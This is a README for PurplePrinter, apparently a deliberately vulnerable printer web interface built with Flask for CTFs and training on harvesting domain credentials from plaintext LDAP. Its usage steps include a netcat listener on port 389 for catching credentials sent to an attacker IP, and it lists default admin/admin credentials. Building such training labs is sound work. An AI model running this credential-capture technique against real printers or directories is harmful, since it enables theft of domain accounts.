# PurplePrinter

A "Printer Web GUI" built on Python 3 and Flask for use in CTF's or training to showcase gathering domain credentials from plaintext LDAP</br>

![My Image](PurplePrinterConfig.png)

Requirements:</br>
-Tested working on Ubuntu Jammy 22.04 with Python 3.10.12</br>
-pip install flask python-ldap</br>
-If you recieve an error installing python-ldap, run sudo apt-get install build-essential libsasl2-dev libldap2-dev libssl-dev</br>

Use:</br>
-git clone https://github.com/PurpleWaveIO/PurplePrinter</br>
-cd PurplePrinter</br>
-python3 purplerprinter.py</br>
-Web Browser: http://IP:5000/</br>
-Login page to save credentials from enumeration/discovery/browser dumps: http://IP:5000/login</br>
-Default Credentials: admin/admin</br>
-Capture Credentials: http://IP:5000/config, on attacking host "nc -lvnp 389", enter attacker IP in Active Directory IP Address field and select the Test button</br>

Docker:</br>
-git clone https://github.com/PurpleWaveIO/PurplePrinter</br>
-cd PurplePrinter</br>
-sudo docker build -t purpleprinter:lastest .</br>
-sudo docker run -p 5000:5000 -d purpleprinter:latest</br>
